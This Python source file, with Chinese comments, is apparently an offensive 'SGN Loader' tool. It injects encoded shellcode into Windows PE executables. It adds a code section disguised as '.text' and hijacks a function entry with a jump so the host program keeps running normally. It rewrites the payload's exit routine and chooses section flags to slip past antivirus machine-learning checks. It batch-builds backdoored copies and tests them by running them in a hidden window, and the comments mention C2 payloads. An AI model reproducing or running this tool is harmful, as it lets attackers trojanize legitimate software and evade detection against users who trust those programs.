# -*- coding: utf-8 -*-
"""
sgn_loader.py —— SGN Loader 补丁规划与批量落地（M2，新增节模式）

流程对应 todo.md 4.2：
  1. 探测架构 → 选择 calc 测试载荷与 sgn -a 参数
  2. sgn 编码 payload（sgn_wrapper）
  3. PE 手术：追加 .bspy RWX 节（[orig][body]），入口写 5 字节 jmp → 节基址
  4. 运行链：jmp → 节内 orig 原样执行 → body(PEB 走链解析 API → VirtualAlloc
     RWX → 拷 payload → CreateThread) → 静态 jmp 回 入口+N，宿主零破坏
  5. batch_patch：对命中列表批量落地 + report.json

注意：全内联方案（stub 直接写函数入口）已实证不可行——stub 覆盖宿主函数
blob_len 字节而尾部无法自愈；新增节方案入口仅占 5 字节且全部原字节保留。
"""
import hashlib
import json
import os
import shutil
import struct

import capstone
import pefile

try:
    from core import asm_loader
except ImportError:  # 直接运行本文件时（sys.path 含 core/）
    import asm_loader

IMAGE_SCN_MEM_EXECUTE = 0x20000000
SEC_NAME = b".text\x00\x00\x00"  # 伪装成常见代码节（多个 .text 合法，PGO 构建常见）；严格 8 字节
# RX 代码节：stub 从不写本节（payload 在 VirtualAlloc 的 RWX 缓冲里解码执行），
# RWX 节是杀软 ML 的头号结构特征，必须避免
SEC_CHARS = 0x60000000 | 0x20000000  # MEM_READ|MEM_EXECUTE|CNT_CODE

# ---- payload 退出中和 -------------------------------------------------------
# msf 风格 payload 末尾的 exitfunk 调用 ExitProcess 会终结宿主进程（宿主 main
# 永远跑不到），且 x64 下 ExitProcess 的关闭链在 payload 线程的栈上触发
# movaps 对齐 AV。中和方案（均为等长替换，sgn 编码前打、解码后即生效）：
#   x64: `bb f0 b5 a2 56` (mov ebx, 0x56a2b5f0) → `bb f7 a5 c8 52`
#        把 block_api 的 exit 哈希从 ExitProcess 换成 FreeLibraryAndExitThread：
#        payload 自带 resolver（kernel32 内 ROR13 匹配）自行解析并调用，
#        rcx=0（原 push0/pop rcx 保留），FreeLibrary(0) 静默失败后仍
#        ExitThread(rdx)，线程干净退出。
#        - modhash 在匹配式中相加抵消 → 只需按名字终哈希做差；
#        - ror 对加减不线性 → 必须逐名求终哈希（含 null 终轮）再相减；
#        - 不能换 ExitThread：kernel32 里它是转发导出（NTDLL.RtlExitUser-
#          Thread），resolver 会拿到转发字符串地址，调用即崩。
#   x86: exit 块 `6a 00 53 ff d5` (push 0/push ebx/call ebp)
#        → `c2 08 00 90 90` = ret 8（线程返回，stdcall 清 2 参）。
_EXIT_HASH_OLD = b"\xbb\xf0\xb5\xa2\x56"
_EXIT_HASH_NEW = b"\xbb\xf7\xa5\xc8\x52"
_EXIT_PAT32 = b"\x6a\x00\x53\xff\xd5"


def neutralize_exit(payload: bytes, arch: int) -> bytes:
    """中和 payload 尾部的 ExitProcess 调用（无匹配则原样返回）。"""
    if arch == 64 and _EXIT_HASH_OLD in payload:
        return payload.replace(_EXIT_HASH_OLD, _EXIT_HASH_NEW, 1)
    if arch == 32 and _EXIT_PAT32 in payload:
        return payload.replace(_EXIT_PAT32, b"\xc2\x08\x00\x90\x90", 1)
    return payload


class PlanError(Exception):
    pass


def detect_arch(pe_path):
    """返回 32 / 64，非 x86 系抛 PlanError"""
    pe = pefile.PE(pe_path, fast_load=True)
    machine = pe.FILE_HEADER.Machine
    pe.close()
    if machine == 0x8664:
        return 64
    if machine == 0x14C:
        return 32
    raise PlanError(f"不支持的架构: {machine:#x}")


def va_to_offset(pe, va):
    """VA → 文件偏移；找不到返回 (None, None)"""
    rva = va - pe.OPTIONAL_HEADER.ImageBase
    for s in pe.sections:
        if s.VirtualAddress <= rva < s.VirtualAddress + max(s.Misc_VirtualSize, s.SizeOfRawData):
            return rva - s.VirtualAddress + s.PointerToRawData, s
    return None, None


def safe_split(code, arch, max_scan=64, min_len=5, aslr=False):
    """
    capstone 安全切分：返回可整体位移的原函数前 N 字节长度（N ≥ min_len = jmp rel32）。
    条件：N 处恰好是完整指令边界；前 N 字节内无控制流、无 RIP 相对寻址。
    aslr=True 时不再一刀切拒绝绝对地址操作数——真正的风险（位移字节是重定位
    目标、拷贝到新节后不被修正）由 plan_patch 的 .reloc 字节覆盖检查精确判定。
    """
    md = capstone.Cs(*(capstone.CS_ARCH_X86, capstone.CS_MODE_64 if arch == 64 else capstone.CS_MODE_32))
    md.detail = True
    off = 0
    count = 0
    for ins in md.disasm(code[:max_scan], 0):
        count += 1
        off += ins.size
        mn = ins.mnemonic
        if mn in ("call", "jmp", "ret", "leave", "int3", "loop", "enter") or mn.startswith("j"):
            return None
        for op in ins.operands:
            if op.type != capstone.x86.X86_OP_MEM:
                continue
            if op.mem.base == capstone.x86.X86_REG_RIP:
                return None
        if off >= min_len:
            return off
    return None


def _align(v, a):
    return (v + a - 1) // a * a


def add_section(pe_path, data):
    """
    PE 手术（手工字节级，绕开 pefile.write 的重排风险）：追加 .bspy RWX 节。
    返回 (new_section_rva, raw_offset, image_base)。
    """
    with open(pe_path, "rb") as f:
        blob = bytearray(f.read())

    pe = pefile.PE(data=bytes(blob), fast_load=False)
    try:
        e_lfanew = pe.DOS_HEADER.e_lfanew
        n_sec = pe.FILE_HEADER.NumberOfSections
        opt_size = pe.FILE_HEADER.SizeOfOptionalHeader
        sec_align = pe.OPTIONAL_HEADER.SectionAlignment
        file_align = pe.OPTIONAL_HEADER.FileAlignment
        image_base = pe.OPTIONAL_HEADER.ImageBase
        last_rva = max(s.VirtualAddress + s.Misc_VirtualSize for s in pe.sections)
        raw_end = max(s.PointerToRawData + s.SizeOfRawData for s in pe.sections)
        first_raw = min((s.PointerToRawData for s in pe.sections if s.SizeOfRawData > 0),
                        default=file_align)
    finally:
        pe.close()

    new_rva = _align(last_rva, sec_align)
    new_raw = _align(raw_end, file_align)
    raw_size = _align(len(data), file_align)

    # 头部空间：新节头(40B) + 现有节头 必须在首节 raw 之前
    headers_end = e_lfanew + 4 + 20 + opt_size + (n_sec + 1) * 40
    if headers_end > first_raw:
        raise PlanError(f"PE 头部无空闲空间放新节头 (需要 {headers_end}, 首节 raw {first_raw:#x})")

    # 1) 写新节头
    import struct
    sec_hdr = SEC_NAME + struct.pack("<IIIIIIHHI",
                                     len(data), new_rva, raw_size, new_raw,
                                     0, 0, 0, 0, SEC_CHARS)
    hdr_off = e_lfanew + 4 + 20 + opt_size + n_sec * 40
    blob[hdr_off:hdr_off + 40] = sec_hdr
    # 2) NumberOfSections (e_lfanew+6, u16)
    struct.pack_into("<H", blob, e_lfanew + 6, n_sec + 1)
    # 3) SizeOfImage (optional header + 56, u32；PE32/PE32+ 同偏移)
    struct.pack_into("<I", blob, e_lfanew + 24 + 56, _align(new_rva + len(data), sec_align))
    # 4) 追加节数据（对齐）
    with open(pe_path, "r+b") as f:
        f.seek(new_raw)
        f.write(bytes(data).ljust(raw_size, b"\x00"))
        f.seek(0)
        f.write(bytes(blob))
    return new_rva, new_raw, image_base


def plan_patch(pe_path, va, arch):
    """
    规划一次新增节 patch：入口安全切分 + jmp 可达性。
    返回 dict: {ok, reason, va, rva, offset, section, orig_bytes, orig_len}
    """
    out = {"ok": False, "reason": "", "va": va, "rva": None, "offset": None,
           "section": None, "orig_bytes": b"", "orig_len": 0}
    pe = pefile.PE(pe_path, fast_load=True)
    try:
        offset, sec = va_to_offset(pe, va)
        if offset is None:
            out["reason"] = "VA 不在任何节内"
            return out
        out["rva"] = va - pe.OPTIONAL_HEADER.ImageBase
        out["offset"] = offset
        out["section"] = sec.Name.rstrip(b"\x00").decode(errors="ignore")

        reasons = []
        if not (sec.Characteristics & IMAGE_SCN_MEM_EXECUTE):
            reasons.append(f"节 [{out['section']}] 不可执行")
        if offset + asm_loader.JMP_LEN + 32 > os.path.getsize(pe_path):
            reasons.append("越过文件末尾")
        if reasons:
            out["reason"] = "; ".join(reasons)
            return out

        with open(pe_path, "rb") as f:
            f.seek(offset)
            head = f.read(64)
        aslr = bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x40)  # DYNAMICBASE
        n = safe_split(head, arch, min_len=asm_loader.JMP_LEN, aslr=aslr)
        if not n:
            out["reason"] = "入口指令无法安全切分（控制流/RIP 相对寻址/不足 5 字节/ASLR 绝对地址）"
            return out
        if aslr:
            # 重定位覆盖检查：位移字节若含重定位目标，加载器只修正 .text 原址，
            # 新节里的拷贝不会被修正 → 拒绝
            reloc_rvas = set()
            try:
                pe.parse_data_directories(
                    directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_BASERELOC"]])
                for tbl in getattr(pe, "DIRECTORY_ENTRY_BASERELOC", []):
                    for ent in tbl.entries:
                        if ent.type != 0:  # 0 = IMAGE_REL_BASED_ABSOLUTE 填充
                            reloc_rvas.add(tbl.struct.VirtualAddress + ent.rva)
            except Exception:
                pass
            bad = [out["rva"] + i for i in range(n) if (out["rva"] + i) in reloc_rvas]
            if bad:
                out["reason"] = f"位移字节含重定位目标 {bad[0]:#x}（ASLR 下新节拷贝不生效）"
                return out
        out["orig_bytes"] = head[:n]
        out["orig_len"] = n
        out["ok"] = True
        return out
    finally:
        pe.close()


def _jmp_target(pe_path, va):
    """解码 va 处首指令；若为无条件 jmp rel32（thunk）返回目标 VA，否则 None。"""
    pe = pefile.PE(pe_path, fast_load=True)
    try:
        off, _ = va_to_offset(pe, va)
        if off is None:
            return None
        with open(pe_path, "rb") as f:
            f.seek(off)
            head = f.read(16)
    finally:
        pe.close()
    md = capstone.Cs(capstone.CS_ARCH_X86,
                     capstone.CS_MODE_64 if detect_arch(pe_path) == 64 else capstone.CS_MODE_32)
    for insn in md.disasm(head, va):
        if insn.mnemonic == "jmp" and len(insn.operands) == 1 \
                and insn.operands[0].type == capstone.x86.X86_OP_IMM:
            return insn.operands[0].imm
        break
    return None


def auto_candidates(pe_path, arch, limit=16, max_scan=0x2000, max_plan_calls=160):
    """VA 留空时的自动候选点列表（M2）。

    策略：入口点 → thunk 跟随（首指令无条件 jmp rel32 则跳目标，最多 6 跳）
    → padding 边界扫描（前一字节为 CC/00/90 填充且当前非填充 = 函数起点候选，
    从入口向后最多 max_scan 字节）。所有候选均通过 plan_patch 校验，按地址序
    返回至多 limit 个 [(va, note), ...]。
    注意：候选不保证都在启动早期被调用——调用方应逐个候选跑验证直到 HIT
    （见 build_verified 的 candidates 参数）。
    全部失败抛 PlanError（附各次原因）。
    """
    reasons = []
    cands = []
    seen = set()

    def _try(va, note):
        if va in seen or len(cands) >= limit:
            return
        seen.add(va)
        plan = plan_patch(pe_path, va, arch)
        if plan["ok"]:
            cands.append((va, note))
        else:
            reasons.append(f"{va:#x}: {plan['reason']}")

    pe = pefile.PE(pe_path, fast_load=True)
    try:
        base = pe.OPTIONAL_HEADER.ImageBase
        entry_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        va = base + entry_rva
    finally:
        pe.close()

    # 1) 入口 + thunk 跟随
    for hop in range(6):
        plan = plan_patch(pe_path, va, arch)
        if plan["ok"]:
            cands.append((va, "入口点" if hop == 0 else f"thunk 跟随×{hop}"))
            seen.add(va)
            break
        reasons.append(f"{va:#x}: {plan['reason']}")
        nxt = _jmp_target(pe_path, va)
        if nxt is None or nxt == va:
            break
        va = nxt

    # 2) padding 边界扫描（从入口向后）
    pe = pefile.PE(pe_path, fast_load=True)
    try:
        sec = next((s for s in pe.sections
                    if s.VirtualAddress <= (va - base) < s.VirtualAddress + s.Misc_VirtualSize
                    and (s.Characteristics & IMAGE_SCN_MEM_EXECUTE)), None)
        if sec is not None:
            start_rva = va - base
            with open(pe_path, "rb") as f:
                f.seek(sec.PointerToRawData + (start_rva - sec.VirtualAddress))
                raw = f.read(min(max_scan,
                                 sec.Misc_VirtualSize - (start_rva - sec.VirtualAddress)))
            PAD = b"\xcc\x00\x90"
            n_plan = 0
            last_ok_rva = None
            for i in range(1, len(raw)):
                if len(cands) >= limit or n_plan >= max_plan_calls:
                    break
                if raw[i - 1] in PAD and raw[i] not in PAD:
                    # 与上一个入选候选至少隔 0x20 字节：过滤函数中段的
                    # 伪起点（凑巧通过 safe_split 的垃圾切分点）
                    if last_ok_rva is not None and i < (last_ok_rva - start_rva) + 0x20:
                        continue
                    before = len(cands)
                    _try(base + start_rva + i, f"扫描函数起点（入口+{i:#x}）")
                    n_plan += 1
                    if len(cands) > before:
                        last_ok_rva = start_rva + i
    finally:
        pe.close()

    if not cands:
        raise PlanError("自动选点失败（请手动填 VA）:\n  " + "\n  ".join(reasons[:6]))
    return cands


def patch_site(pe_path, out_path, va, payload, arch):
    """
    对单个 VA 构建新增节补丁并写出补丁文件。
    返回 report_item dict；失败抛 PlanError。
    """
    plan = plan_patch(pe_path, va, arch)
    if not plan["ok"]:
        raise PlanError(plan["reason"])

    # 0) 量 stub 长度（内容与 section_rva 无关：D_PAYLOAD 是内部相对量、
    #    BACK_ADDR 是绝对 RVA 常量），据此预留节空间
    stub0, meta0 = asm_loader.build_section_stub(
        arch, plan["orig_bytes"], payload, 0, plan["rva"] + plan["orig_len"])

    # 0.5) 退出中和（8→8 等长替换，不改变 stub 量测输入）
    exit_note = None
    patched = neutralize_exit(payload, arch)
    if patched != payload:
        exit_note = "exit neutralized (thread-exit)"
        payload = patched

    # 2) 复制目标 → 加节（占位数据）→ 得到真实 RVA/raw
    shutil.copy2(pe_path, out_path)
    section_data_len = len(stub0) + len(payload)
    new_rva, new_raw, image_base = add_section(out_path, b"\x00" * section_data_len)

    # 2) 以真实 RVA 组装最终 stub（长度必须不变），节内容 = [orig][body][payload]
    stub, meta = asm_loader.build_section_stub(
        arch, plan["orig_bytes"], payload, new_rva, plan["rva"] + plan["orig_len"])
    if len(stub) != len(stub0):
        raise PlanError(f"stub 长度漂移 {len(stub)} != {len(stub0)}")

    with open(out_path, "r+b") as f:
        f.seek(new_raw)
        f.write(stub + payload)
        # 4) 入口写 jmp rel32（仅 5 字节，宿主代码零破坏）
        jmp = asm_loader.make_jmp_patch(plan["rva"], new_rva)
        f.seek(plan["offset"])
        f.write(jmp)

    return {
        "va": va, "rva": plan["rva"], "offset": plan["offset"], "section": plan["section"],
        "orig_bytes": plan["orig_bytes"].hex(), "orig_len": plan["orig_len"],
        "new_section_rva": new_rva, "new_section_raw": new_raw,
        "stub_len": len(stub), "payload_len": len(payload),
        "exit_note": exit_note,
        "jmp_patch": jmp.hex(),
        "back_rva": meta["back_rva"],
        "out_path": os.path.basename(out_path),
        "ok": True,
    }


def _image_base(pe_path):
    pe = pefile.PE(pe_path, fast_load=True)
    try:
        return pe.OPTIONAL_HEADER.ImageBase
    finally:
        pe.close()


def batch_patch(pe_path, hits, payload, arch, out_dir, extra_meta=None):
    """
    批量落地：对每个命中 VA 各写一个补丁副本（各自带独立 .bspy 节），
    并生成 report.json。返回 (output_paths, report_dict)。
    """
    os.makedirs(out_dir, exist_ok=True)
    stem = os.path.splitext(os.path.basename(pe_path))[0]
    ext = os.path.splitext(pe_path)[1]
    outputs = []
    items = []
    for i, va in enumerate(hits):
        out_path = os.path.join(out_dir, f"{stem}_sgn_{i}_{va:X}{ext}")
        try:
            item = patch_site(pe_path, out_path, va, payload, arch)
        except PlanError as e:
            items.append({"va": va, "ok": False, "reason": str(e)})
            continue
        items.append(item)
        outputs.append(out_path)

    report = {
        "target": os.path.abspath(pe_path),
        "arch": arch,
        "mode": "new_section(.bspy)",
        "payload_sha256": hashlib.sha256(payload).hexdigest(),
        "payload_len": len(payload),
        "hits": items,
        "outputs": [os.path.abspath(o) for o in outputs],
        "extra": extra_meta or {},
    }
    report_path = os.path.join(out_dir, "report.json")
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    return outputs, report


def build_verified(pe_path, va, shellcode, arch, out_dir, sgn=False, attempts=None,
                   watch_secs=6.0, trigger_names=("calc.exe", "calculatorapp.exe"),
                   host_wait_secs=12.0, log=None, candidates=None, should_stop=None,
                   sgn_iterations=1):
    """构建 + 无头运行验证 + 失败重编码重试（对抗 sgn 偶发坏编码）。

    va/candidates：candidates 为 VA 列表时逐候选验证，每个候选都会被尝试
    （无硬上限；attempts=None 时兜底 = 候选数 × 3，防单候选死循环）。
    失败分流：运行崩溃 → 疑似 sgn 坏编码，同候选重编码（每候选最多 3 次）；
    干净退出无 HIT → 函数未被调用，换下一候选；patch 失败 → 换下一候选。
    判定：监控模式=watch_secs 内出现新的触发进程即成功（宿主事后退出码仅
    记录，不否决）；存活模式（trigger_names=None）=目标常驻过 watch_secs
    窗口（或其后正常退出）。
    trigger_names=None 切换为存活判定（C2 等不弹新进程的 shellcode）：
    目标进程常驻过 watch_secs 窗口（或其后正常退出）即成功。
    should_stop: callable，返回 True 时尽快中止并返回当前结果。
    返回 dict(out_path=..., attempts=N, va=..., hit=bool, exit=..., ok=bool)。
    需要 psutil（延迟导入）。
    """
    import subprocess
    import time

    def _log(msg):
        if log:
            log(msg)

    cand_list = list(candidates) if candidates else [va]
    if attempts is None:
        attempts = max(4, len(cand_list) * 3)  # 兜底：每候选最多 3 次重编码
    last = {"out_path": None, "attempts": 0, "va": None, "hit": False,
            "exit": None, "ok": False}
    ci = 0        # 当前候选下标
    enc_tries = 0  # 当前候选的重编码次数
    attempt = 0
    while ci < len(cand_list) and attempt < attempts:
        if should_stop and should_stop():
            _log("[!] 用户停止")
            return last
        attempt += 1
        last["attempts"] = attempt
        va = cand_list[ci]
        last["va"] = va
        payload = shellcode
        if sgn:
            try:
                from core import sgn_wrapper
            except ImportError:
                import sgn_wrapper
            # 退出中和必须在 sgn 编码前打（编码形态匹配不到 exit 模式）；
            # iterations>1 = 多层编码（防模拟：模拟器需连续解码 N 层）
            payload = sgn_wrapper.encode(neutralize_exit(shellcode, arch), arch,
                                         iterations=sgn_iterations)
            _log(f"[sgn] attempt {attempt}: {len(shellcode)}B -> {len(payload)}B "
                 f"({sgn_iterations} 层)")
        outs, rep = batch_patch(pe_path, [va], payload, arch, out_dir)
        if not outs:
            reason = rep["hits"][0].get("reason", "unknown")
            _log(f"[!] attempt {attempt} patch 失败 @ {va:#x}: {reason}，换下一候选")
            last["exit"] = "patch-failed"
            ci += 1
            enc_tries = 0
            continue
        out_path = outs[0]
        last["out_path"] = out_path

        import psutil
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        triggers = {n.lower() for n in (trigger_names or ())}
        base = {p.pid for p in psutil.process_iter(["name"])
                if p.info["name"] and p.info["name"].lower() in triggers}
        proc = subprocess.Popen([out_path], startupinfo=si,
                                creationflags=subprocess.CREATE_NO_WINDOW)
        t0 = time.time()
        hit = False
        while time.time() - t0 < watch_secs:
            now = {p.pid for p in psutil.process_iter(["name"])
                   if p.info["name"] and p.info["name"].lower() in triggers}
            if now - base:
                hit = True
                break
            if proc.poll() is not None:
                break
            if should_stop and should_stop():
                break
            time.sleep(0.2)
        if not hit:
            t1 = time.time()
            while proc.poll() is None and time.time() - t1 < host_wait_secs:
                if should_stop and should_stop():
                    break
                time.sleep(0.3)
        rc = proc.poll()
        try:
            proc.kill()
        except Exception:
            pass
        if should_stop and should_stop():
            last.update(hit=hit, exit=rc if rc is not None else "running")
            _log("[!] 用户停止")
            return last
        survived = rc is None or rc == 0
        last.update(hit=hit, exit=rc if rc is not None else "running")
        # 成功判据：监控模式=触发进程出现即成功（宿主事后退出码仅记录）；
        # 存活模式=目标常驻窗口期（或其后正常退出）
        last["ok"] = bool(hit) if triggers else survived
        if last["ok"]:
            note = "" if survived else f"（宿主事后 exit={rc & 0xFFFFFFFF:#x}，仅记录不作判据）"
            _log(f"[+] attempt {attempt} @ {va:#x} HIT!{note}")
            return last

        if rc not in (None, 0):
            # 崩溃且无触发进程：sgn 模式下大概率是坏编码 → 同候选重编码；否则换候选
            if sgn and enc_tries < 2:
                enc_tries += 1
                _log(f"[!] attempt {attempt} @ {va:#x} 崩溃 exit={rc & 0xFFFFFFFF:#x}（无触发进程），"
                     f"疑似 sgn 坏编码，重编码重试 ({enc_tries}/2)…")
            else:
                _log(f"[!] attempt {attempt} @ {va:#x} 崩溃 exit={rc & 0xFFFFFFFF:#x}，换下一候选")
                ci += 1
                enc_tries = 0
        else:
            # 干净退出/仍运行但无触发 → 该函数未被调用或 payload 未生效
            _log(f"[!] attempt {attempt} @ {va:#x} 无 HIT (exit={last['exit']})，换下一候选")
            ci += 1
            enc_tries = 0
        time.sleep(0.5)
    return last


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else os.path.join("testfile", "test_pe", "vnetlib64.exe")
    arch = detect_arch(target)
    pe = pefile.PE(target, fast_load=True)
    entry = pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint
    pe.close()
    print(f"[i] target={target} arch={arch} entry={entry:#x}")
    with open("testfile/calc64.bin" if arch == 64 else "testfile/calc32.bin", "rb") as f:
        raw = f.read()
    raw = neutralize_exit(raw, arch)
    import sgn_wrapper
    enc = sgn_wrapper.encode(raw, arch)
    print(f"[i] sgn: {len(raw)}B -> {len(enc)}B")
    outs, rep = batch_patch(target, [entry], enc, arch, "test_sgn_out")
    print(f"[+] outputs: {outs}")
    print(f"[+] report hits: {[(h['va'], h['ok'], h.get('reason', '')) for h in rep['hits']]}")
